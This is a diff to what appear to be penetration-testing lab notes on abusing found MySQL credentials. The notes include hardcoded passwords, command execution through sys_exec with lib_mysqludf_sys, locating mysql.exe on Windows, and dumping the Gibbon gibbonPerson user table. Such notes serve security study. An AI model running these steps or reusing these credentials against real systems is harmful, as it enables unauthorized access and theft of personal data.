@@ -2,7 +2,7 @@ found db/sql creds:
 ```
 mysql -u lewis -p'P4ntherg0t1n5r3c0n##' joomla
 ```
-- `P4ntherg0t1n5r3c0n##` is password goes between `-p''`
+- `P4ntherg0t1n5r3c0n##` is password goes between `-p''` no space
 - `joomla` is name of database
 default root sql creds:
 ```
@@ -41,3 +41,24 @@ SELECT sys_exec('whoami');
 ```
 - only works if lib_mysqludf_sys is installed
 	- otherwise, need to escape
+
+---
+#### Windows
+```
+Get-ChildItem -Path C:\ -Recurse -Include mysql.exe -ErrorAction SilentlyContinue -Force
+```
+- Find sql.exe filepath
+	- usually `C:\xampp\mysql\bin\mysql.exe`
+```
+C:\xampp\mysql\bin\mysql.exe -u MrGibbonsDB -p
+```
+- will prompt for pw
+	- if no prompt try try this:
+```
+C:\xampp\mysql\bin\mysql.exe --protocol=TCP -h 127.0.0.1 -P 3306 -u MrGibbonsDB -pMisterGibbs!Parrot!?1 -e "SHOW DATABASES;"
+```
+- if that works, dump users:
+```
+C:\xampp\mysql\bin\mysql.exe --protocol=TCP -h 127.0.0.1 -P 3306 -u MrGibbonsDB -pMisterGibbs!Parrot!?1 -e "USE gibbon; SELECT * FROM gibbonPerson;" -E
+```
+![[Pasted image 20250416092654.png]]
